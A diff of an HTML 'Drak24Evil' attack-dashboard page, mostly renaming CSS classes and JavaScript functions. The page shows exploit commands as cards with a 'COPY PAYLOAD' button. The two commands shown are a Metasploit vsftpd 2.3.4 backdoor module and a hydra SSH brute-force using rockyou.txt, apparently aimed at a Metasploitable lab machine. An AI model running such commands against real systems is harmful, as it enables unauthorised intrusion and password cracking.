@@ -5,47 +5,39 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Drak24Evil | Live 28-Target Audit</title>
     <style>
-        :root {
-            --blue: #00d4ff; --red: #ff3e3e; --orange: #ff9d00;
-            --bg: #0a0b0c; --card: #14171a; --green: #00ff41; --web: #9b59b6;
-        }
+        :root { --bl: #00d4ff; --rd: #ff3e3e; --or: #ff9d00; --bg: #0a0b0c; --cd: #14171a; --gr: #00ff41; --wb: #9b59b6; }
         body { background: var(--bg); color: #e1e1e1; font-family: sans-serif; margin: 0; padding: 0; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 15px; }
-        header {
-            background: var(--card); padding: 15px; border-bottom: 3px solid var(--blue);
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 20px; border-radius: 0 0 10px 10px;
-        }
+        .cont { max-width: 1200px; margin: 0 auto; padding: 15px; }
+        header { background: var(--cd); padding: 15px; border-bottom: 3px solid var(--bl); display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-radius: 0 0 10px 10px; }
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px; }
-        .card { background: var(--card); border: 1px solid #333; padding: 15px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        .card { background: var(--cd); border: 1px solid #333; padding: 15px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
         .card:active { background: #1c2024; transform: scale(0.98); }
-        .port-text { color: var(--blue); font-family: monospace; font-size: 0.8em; font-weight: bold; }
-        .overlay { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(4px); }
-        .modal { background: #111; margin: 5% auto; padding: 20px; width: 85%; max-width: 600px; border: 1px solid var(--blue); border-radius: 12px; max-height: 85vh; overflow-y: auto; }
-        .close { float: right; font-size: 30px; color: #fff; cursor: pointer; line-height: 1; }
-        .label { color: var(--blue); font-size: 0.75em; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
-        .box { background: #000; padding: 12px; border-radius: 6px; border-left: 3px solid var(--green); font-family: monospace; font-size: 0.9em; margin-top: 5px; white-space: pre-wrap; word-break: break-all; color: var(--green); }
-        .tag { float: right; font-size: 0.6em; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
-        .crit { background: var(--red); color: #fff; }
-        .high { background: var(--orange); color: #000; }
-        .web { background: var(--web); color: #fff; }
-        .btn { background: var(--blue); color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; width: 100%; }
+        .p-text { color: var(--bl); font-family: monospace; font-size: 0.8em; font-weight: bold; }
+        .ov { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); backdrop-filter: blur(5px); }
+        .md { background: #111; margin: 5% auto; padding: 20px; width: 85%; max-width: 600px; border: 1px solid var(--bl); border-radius: 12px; max-height: 85vh; overflow-y: auto; }
+        .cl { float: right; font-size: 30px; color: #fff; cursor: pointer; line-height: 1; }
+        .lb { color: var(--bl); font-size: 0.75em; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
+        .bx { background: #000; padding: 12px; border-radius: 6px; border-left: 3px solid var(--gr); font-family: monospace; font-size: 0.9em; margin-top: 5px; white-space: pre-wrap; word-break: break-all; color: var(--gr); }
+        .tg { float: right; font-size: 0.6em; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+        .crit { background: var(--rd); color: #fff; }
+        .high { background: var(--or); color: #000; }
+        .web { background: var(--wb); color: #fff; }
+        .bt { background: var(--bl); color: #000; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="cont">
     <header>
-        <div><h2 style="margin:0; color:var(--blue);">DRAK24EVIL ULTRA</h2><small style="color:#666;">COMPLETE 28 TARGET DATABASE</small></div>
+        <div><h2 style="margin:0; color:var(--bl);">DRAK24EVIL ULTRA</h2><small style="color:#666;">28 TARGET LIVE DATABASE</small></div>
         <a href="https://t.me/Drak24Evil" target="_blank" style="color:#24A1DE; text-decoration:none; font-weight:bold;">Telegram</a>
     </header>
     <div class="grid" id="mainGrid"></div>
 </div>
 
-<div id="pocModal" class="overlay"><div class="modal"><span class="close" id="closeBtn">&times;</span><div id="pocBody"></div></div></div>
+<div id="pocModal" class="ov"><div class="md"><span class="cl" id="closeBtn">&times;</span><div id="pocBody"></div></div></div>
 
 <script>
-// FULL 28 TARGET DATASET
 var data = [
     {p:"21", n:"vsftpd 2.3.4 Backdoor", s:"Critical", e:"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS [IP]\nexploit"},
     {p:"22", n:"SSH Brute Force", s:"High", e:"hydra -l msfadmin -P rockyou.txt [IP] ssh"},
@@ -82,23 +74,21 @@ for (var i = 0; i < data.length; i++) {
     (function(item){
         var d = document.createElement('div');
         d.className = 'card';
-        var t = item.p === 'WEB' ? 'web' : (item.s === 'Critical' ? 'crit' : 'high');
-        d.innerHTML = '<span class="tag '+t+'">'+item.s+'</span><span class="port-text">REF: '+item.p+'</span><h3>'+item.n+'</h3>';
+        var tc = item.p === 'WEB' ? 'web' : (item.s === 'Critical' ? 'crit' : 'high');
+        d.innerHTML = '<span class="tg '+tc+'">'+item.s+'</span><span class="p-text">PORT '+item.p+'</span><h3>'+item.n+'</h3>';
         d.onclick = function() {
-            document.getElementById('pocBody').innerHTML = '<h2>'+item.n+'</h2><span class="label">Exploit Command</span><div id="copyBox" class="box">'+item.e+'</div><button class="btn" onclick="copyIt()">COPY PAYLOAD</button>';
+            document.getElementById('pocBody').innerHTML = '<h2>'+item.n+'</h2><span class="lb">Command</span><div id="cpBx" class="bx">'+item.e+'</div><button class="bt" onclick="cp()">COPY PAYLOAD</button>';
             document.getElementById('pocModal').style.display = 'block';
         };
         g.appendChild(d);
     })(data[i]);
 }
 
-function copyIt() {
-    var text = document.getElementById('copyBox').innerText;
+function cp() {
+    var text = document.getElementById('cpBx').innerText;
     var inp = document.createElement('textarea');
-    inp.value = text;
-    document.body.appendChild(inp);
-    inp.select();
-    document.execCommand('copy');
+    inp.value = text; document.body.appendChild(inp);
+    inp.select(); document.execCommand('copy');
     document.body.removeChild(inp);
     alert('Copied!');
 }
